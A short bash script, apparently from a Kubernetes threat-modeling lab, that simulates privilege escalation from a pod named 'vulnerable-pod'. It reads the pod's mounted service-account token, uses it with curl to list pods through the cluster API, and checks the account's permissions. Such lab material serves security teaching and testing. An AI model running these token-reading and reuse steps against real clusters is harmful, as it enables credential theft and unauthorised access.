#!/bin/bash
echo "=== PRIVILEGE ESCALATION SIMULATION ==="
echo "Current Service Account:"
kubectl exec vulnerable-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
echo "Service Account Token (first 50 chars):"
kubectl exec vulnerable-pod -- head -c 50 /var/run/secrets/kubernetes.io/serviceaccount/token
echo "Attempting to list pods using token:"
kubectl exec vulnerable-pod -- sh -c '
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods
' 2>/dev/null | head -20
kubectl auth can-i --list --as=system:serviceaccount:threat-modeling-lab:default
